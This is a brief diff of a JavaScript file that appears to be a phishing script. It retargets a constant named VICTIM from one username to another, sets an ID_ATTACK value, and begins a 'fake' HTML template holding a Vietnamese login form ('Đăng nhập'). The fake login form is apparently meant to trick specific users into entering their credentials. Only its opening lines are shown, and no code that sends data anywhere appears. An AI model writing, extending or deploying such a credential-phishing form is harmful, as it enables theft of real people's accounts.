@@ -1,4 +1,4 @@
-const VICTIM = 'hoanmy';
+const VICTIM = 'thaiadhp';
 const ID_ATTACK = 199658;
 const fake = `<div class="container">
 <div class="form" style="padding-top:25px"><div class="row justify-content-center"><h3>Đăng nhập</h3></div>
